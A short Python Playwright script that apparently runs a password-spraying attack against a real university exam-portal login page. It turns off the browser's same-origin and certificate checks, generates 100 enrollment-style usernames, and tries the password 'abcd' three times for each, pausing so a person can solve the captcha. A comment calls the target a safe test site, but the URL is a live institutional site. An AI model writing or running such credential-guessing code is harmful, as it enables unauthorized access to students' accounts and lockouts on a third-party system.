import asyncio
from playwright.async_api import async_playwright

async def run():
    async with async_playwright() as p:
        # Launch Edge with unsafe flags
        browser = await p.chromium.launch(
            channel="msedge",
            headless=False,
            args=[
                "--disable-web-security",   # unsafe: disables same-origin checks
                "--ignore-certificate-errors",  # unsafe: ignores SSL errors
                "--disable-features=IsolateOrigins,site-per-process"
            ]
        )
        page = await browser.new_page()

        await page.goto("https://examweb.ggsipu.ac.in/web/login.jsp")  # use a safe test site

        # Loop through usernames 000–099
        for i in range(100):
            username = f"{i:03d}15002724"
            password = "abcd"

            # Repeat 3 times per user
            for attempt in range(3):
                await page.fill("#username", username)
                await page.fill("#passwd", password)

                print(f"Attempt {attempt+1} for {username}")
                # Pause for manual captcha solve
                await page.wait_for_timeout(10000)

                await page.click(".btn-login")  # replace with actual selector

                # Reset for next attempt
                await page.wait_for_timeout(2000)
                await page.goto("https://examweb.ggsipu.ac.in/web/login.jsp")

        await browser.close()

asyncio.run(run())
